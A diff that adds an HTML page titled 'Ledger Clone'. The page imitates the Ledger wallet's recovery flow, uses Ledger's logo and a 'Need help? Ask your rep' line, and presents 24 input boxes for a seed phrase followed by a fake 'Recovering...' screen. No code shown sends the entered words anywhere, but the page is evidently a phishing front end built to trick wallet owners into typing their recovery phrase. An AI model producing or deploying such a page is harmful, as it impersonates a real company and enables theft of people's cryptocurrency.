@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Ledger Clone</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%;overflow:hidden;background:#0a0a0a;font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text',sans-serif}
+
+.app{height:100dvh;display:flex;flex-direction:column}
+
+/* TOP (Ledger purple bar) */
+.top{
+    background:linear-gradient(135deg,#b39ddb,#9575cd);
+    padding:14px 16px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    flex-shrink:0;
+}
+
+.logo{width:70px;filter:invert(1)}
+.help{color:#fff;font-size:11px;opacity:.8;text-align:right}
+
+/* CONTENT AREA */
+.main{
+    flex:1;
+    display:flex;
+    flex-direction:column;
+    overflow:hidden;
+}
+
+.scroll{
+    flex:1;
+    overflow-y:auto;
+    padding:20px 16px;
+}
+
+/* PROGRESS */
+.progress{
+    height:4px;
+    background:#222;
+    border-radius:4px;
+    margin-bottom:24px;
+    position:relative;
+}
+.progress-bar{
+    height:100%;
+    background:#fff;
+    width:25%;
+    border-radius:4px;
+    transition:.3s;
+}
+
+/* TEXT */
+.title{
+    color:#fff;
+    font-size:24px;
+    font-weight:700;
+    margin-bottom:12px;
+}
+.desc{
+    color:rgba(255,255,255,.7);
+    font-size:14px;
+    line-height:1.5;
+    margin-bottom:24px;
+}
+
+/* NETWORKS */
+.network{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:14px;
+    border-radius:14px;
+    background:#111;
+    border:1px solid rgba(255,255,255,.08);
+    margin-bottom:10px;
+}
+.network.active{
+    border-color:#b39ddb;
+    background:rgba(179,157,219,.15);
+}
+
+/* INPUTS */
+.inputs{
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:12px;
+}
+.input{
+    background:#111;
+    border:1px solid #333;
+    border-radius:10px;
+    padding:12px;
+    color:#fff;
+    font-size:14px;
+}
+
+/* FOOTER BUTTONS */
+.footer{
+    padding:12px 16px;
+    border-top:1px solid rgba(255,255,255,.08);
+    display:flex;
+    gap:10px;
+    flex-shrink:0;
+}
+
+.btn{
+    flex:1;
+    border:none;
+    border-radius:999px;
+    padding:14px;
+    font-weight:600;
+    font-size:15px;
+}
+
+.btn.primary{background:#fff;color:#000}
+.btn.secondary{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.3)}
+
+/* STEPS */
+.step{display:none;height:100%;flex-direction:column}
+.step.active{display:flex}
+
+/* MOBILE */
+@media(max-width:480px){
+.inputs{grid-template-columns:1fr}
+}
+
+</style>
+</head>
+<body>
+
+<div class="app">
+
+  <div class="top">
+    <img class="logo" src="https://ledger.com/logo.svg">
+    <div class="help">Need help?<br>Ask your rep</div>
+  </div>
+
+  <div class="main">
+
+    <div class="scroll">
+
+      <div class="progress"><div class="progress-bar" id="bar"></div></div>
+
+      <div id="s1" class="step active">
+        <div class="title">Restore from recovery phrase</div>
+        <div class="desc">Restore your Ledger device to access your crypto assets.</div>
+      </div>
+
+      <div id="s2" class="step">
+        <div class="title">Select networks</div>
+        <div class="network" onclick="toggle(this)">Bitcoin</div>
+        <div class="network" onclick="toggle(this)">Ethereum</div>
+        <div class="network" onclick="toggle(this)">Solana</div>
+      </div>
+
+      <div id="s3" class="step">
+        <div class="title">Enter recovery phrase</div>
+        <div class="inputs" id="inputs"></div>
+      </div>
+
+      <div id="s4" class="step">
+        <div class="title">Recovering...</div>
+        <div class="desc">Scanning wallets and restoring assets...</div>
+      </div>
+
+    </div>
+
+    <div class="footer">
+      <button class="btn secondary" onclick="back()">Back</button>
+      <button class="btn primary" onclick="next()">Next</button>
+    </div>
+
+  </div>
+</div>
+
+<script>
+let step=1
+
+function show(){
+  document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'))
+  document.getElementById('s'+step).classList.add('active')
+  document.getElementById('bar').style.width=(step*25)+'%'
+}
+
+function next(){if(step<4){step++;show()}}
+function back(){if(step>1){step--;show()}}
+
+function toggle(el){el.classList.toggle('active')}
+
+function init(){
+  const c=document.getElementById('inputs')
+  for(let i=1;i<=24;i++){
+    let input=document.createElement('input')
+    input.placeholder=i
+    input.className='input'
+    c.appendChild(input)
+  }
+}
+init()
+</script>
+
+</body>
+</html>
